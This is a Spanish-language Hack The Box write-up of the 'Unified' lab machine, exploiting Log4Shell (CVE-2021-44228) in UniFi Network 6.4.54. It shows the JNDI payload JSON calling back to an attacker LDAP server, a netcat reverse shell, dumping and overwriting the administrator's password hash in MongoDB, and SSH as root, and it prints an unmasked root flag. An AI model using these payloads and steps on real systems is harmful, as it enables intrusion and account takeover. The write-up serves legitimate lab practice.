---
title: Unified
date: 2025-08-6 11:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, unified, unifi network, mongodb, log4j, log4shell]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/525ba0e35574d9240e878bb8c716661e.png
    alt: Hack The Box
---

## Task1

Which are the first four open ports? 

La primera tarea nos pregunta cuales son los primeros cuatro puertos abiertos.
``` shell
┌──(kali㉿kali25)-[~]
└─$ nmap -p- -sV -T4 -vv 10.129.117.96

PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
6789/tcp open  ibm-db2-admin?  syn-ack ttl 63
8080/tcp open  http            syn-ack ttl 63 Apache Tomcat (language: en)
8443/tcp open  ssl/nagios-nsca syn-ack ttl 63 Nagios NSCA
8843/tcp open  ssl/http        syn-ack ttl 63 Apache Tomcat (language: en)
8880/tcp open  http            syn-ack ttl 63 Apache Tomcat (language: en)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> 22,6789,8080,8443

## Task2

What is the title of the software that is running running on port 8443? 

Si visitamos la URL https://10.129.117.96:8443/ con el navegador nos aparece una web de lo que parece una app **Unifi Network**

> UniFi Network

## Task3

What is the version of the software that is running? 

Debajo del logo **Unifi Network** aparece la versión

> 6.4.54

## Task4

What is the CVE for the identified vulnerability? 

Buscas un poquito CVEs sobre este dispositivo y enseguida aparece el que necesitamos.

> CVE-2021-44228

De pasó encontré lo que parece un exploit ya preparado para explotarlo [https://github.com/puzzlepeaches/Log4jUnifi](https://github.com/puzzlepeaches/Log4jUnifi), este repositirio trae enlaces con una explicación más extensa del exploit Log4Shell, una vulnerabilidad que permite RCE además trae instrucciones de como usarlo, así que para que pensarlo más voy a seguir las instrucciones sin complicarme entrar en detalles de como funciona.

``` shell
┌──(kali㉿kali25)-[~/Log4jUnifi]
└─$ apt update && apt install openjdk-11-jre maven

python -m venv . # crear el virtual enviroment
                                                                                               
source bin/activate # activar el venv

pip install -r requirements.txt

mvn package -f utils/rogue-jndi/ # seguimos las instrucciones del proyecto, lanzando maven
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  38.767 s
[INFO] Finished at: 2025-08-06T13:12:37+02:00
[INFO] -----
```

Maven termina con ```BUILD SUCCESS```. Ahora siguiendo las instrucciones de uso, lanzamos el payload indicando la dirección de callback y el puerto además de la URL de la app que vamos a explotar.

``` shell
┌──(Log4jUnifi)─(kali㉿kali25)-[~/Log4jUnifi]
└─$ python3 exploit.py -u https://10.129.117.96:8443 -i 10.10.15.58 -p 4444 
[*] Starting malicous JNDI Server
{"username": "${jndi:ldap://10.10.15.58:1389/o=tomcat}", "password": "log4j", "remember": "${jndi:ldap://10.10.15.58:1389/o=tomcat}", "strict":true}
[*] Firing payload!
[*] Check for a callback!
```

En otra terminal tenemos que deja a la escucha un netcat para recibir la conexión

``` shell
┌──(kali㉿kali25)-[~/Log4jUnifi]
└─$ nc -lvnp 4444                 
listening on [any] 4444 ...
connect to [10.10.15.58] from (UNKNOWN) [10.129.117.96] 33778
whoami
unifi
```

Ahora tenemos una shell y podemos interactuar con el sistema como usuario ```unifi```. 

## Task5

What protocol does JNDI leverage in the injection? 

Parece bastante obvio adivinar que es ```ldap``` ```jndi:ldap://10.10.15.58:1389/o=tomcat```

> ldap

## Task6

What tool do we use to intercept the traffic, indicating the attack was successful? 

Adivino que es tcpdump pues no me ha hecho falta interceptar el tráfico para verifircar que el ataque a tenido éxito cuando tengo una shell. Aunque sería una forma de verificarlo imagino. 

> tcpdump

## Task7

What port do we need to inspect intercepted traffic for? 

Sabemos que el puerto LDAP suele ser el 389 o el 636

> 389

## Task8

What port is the MongoDB service running on? 

El puerto más común y por defecto es 27017 pero para averiguarlo lance el siguiente comando en la shell obtenida dado que el sistema carece de los comandos netstat, lsof o ss.

```
ps aux | grep mongo
unifi         67  0.2  4.1 1100672 84992 ?       Sl   11:29   0:16 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
unifi       2989  0.0  0.0  11468  1060 ?        S    13:16   0:00 grep mongo
```

> 27117

## Task9

What is the default database name for UniFi applications? 

Esta información la podemos encontrar en la propias guías de [https://ubntwiki.com/guides/changing_the_default_site_in_unifi](https://ubntwiki.com/guides/changing_the_default_site_in_unifi), pero vamos a comprobarlo conectándonos 

 
``` shell
unifi@unified:/usr/lib/unifi$ mongo -port 27117
mongo -port 27117
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/
MongoDB server version: 3.6.3
Welcome to the MongoDB shell.
For interactive help, type "help".

> show dbs
shshow dbs
ace       0.002GB
ace_stat  0.000GB
admin     0.000GB
config    0.000GB
local     0.000GB

> use ace
ususe ace
switched to db ace
```

> ace

## Task10

What is the function we use to enumerate users within the database in MongoDB? 


``` shell
> db.admin.find()
{ "_id" : ObjectId("61ce278f46e0fb0012d47ee4"), "name" : "administrator", "email" : "administrator@unified.htb", "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.", "time_created" : NumberLong(1640900495), "last_site_name" : "default", "ui_settings" : { "neverCheckForUpdate" : true, "statisticsPrefferedTZ" : "SITE", "statisticsPreferBps" : "", "tables" : { "device" : { "sortBy" : "type", "isAscending" : true, "initialColumns" : [ "type", "deviceName", "status", "connection", "network", "ipAddress", "experience", "firmwareStatus", "downlink", "uplink", "dailyUsage" ], "columns" : [ "type", "deviceName", "status", "macAddress", "model", "ipAddress", "connection", "network", "experience", "firmwareStatus", "firmwareVersion", "memoryUsage", "cpuUsage", "loadAverage", "utilization", "clients", "lastSeen", "downlink", "uplink", "dailyUsage", "uptime", "wlan2g", "wlan5g", "radio2g", "radio5g", "clients2g", "clients5g", "bssid", "tx", "rx", "tx2g", "tx5g", "channel", "channel2g", "channel5g" ] }, "client" : { "sortBy" : "physicalName", "isAscending" : true, "initialColumns" : [ "status", "clientName", "physicalName"
```

> db.admin.find()

## Task11

What is the function we use to update users within the database in MongoDB? 

Antes de actualizar la clave hay que generar una nueva
```

┌──(kali㉿kali25)-[~/Log4jUnifi]
└─$ mkpasswd -m sha-512 secret1234
$6$D63hi7/CVUZncSC7$rrYLcbmKhbKNIgGbd/K5PaGALF.xUFvaTuxO07oKX9sFGtGJQwfQeRzc1aTmStipNxrfm4pTfqxhtpfayF2lu1
```

Modificamos el registro del administrator con la password que nos interesa 

``` shell
db.admin.update(
  { name: "administrator" }, // Filtro
  { $set: { x_shadow: "$6$D63hi7/CVUZncSC7$rrYLcbmKhbKNIgGbd/K5PaGALF.xUFvaTuxO07oKX9sFGtGJQwfQeRzc1aTmStipNxrfm4pTfqxhtpfayF2lu1" } }
)
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
```

El propio enunciado de la tarea nos da una pista, debemos utilizar el método adecuado para actualizar la password del administrador y de esta forma conseguir unas credenciales que nos deberían dar acceso como administrador. 

> db.admin.update()

Ahora con la password actualizada podemos logearnos y acceder al dashboard de Unifi Network 

## Task12

What is the password for the root user? 

Ahora que tenemos acceso a la interface web de Unifi Network podemos ir a Settings y en en apartado "Site" buscamos el formulario 

``` html
Enable SSH authentication 
Username
Password
```

Al pulsar el 👁️ nos muestra la password 

> NotACrackablePassword4U2022

Submit user flag 

``` shell
ls /home
michael
ls /home/michael
user.txt
cat /home/michael/user.txt
6ced1a6a89e666c0************
```
> 6ced1a6a89e666c0************

Como ya teníamos shell obtener la flag de usuario es sencillo.

## Submit root flag

``` shell                                                                                                   
┌──(kali㉿kali25)-[~/Log4jUnifi]
└─$ ssh root@10.129.117.96
root@10.129.117.96's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

root@unified:~# ls
root.txt
root@unified:~# cat root.txt 
e50bc93c75b634e4b272d2f771c33681
```

> e50bc93c75b634e4b272d2f771c33681

Cambiada la pass de root ya solo falta conectarnos por SSH (por ejemplo) y hacer lo que nos de la gana.

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/441)

Y hasta aquí creo que he completado todos los retos "gratuitos" del Tier 0 al 2 que hasta la fecha venía ofrenciendo HTB. Si salen más intentaré hacer más. 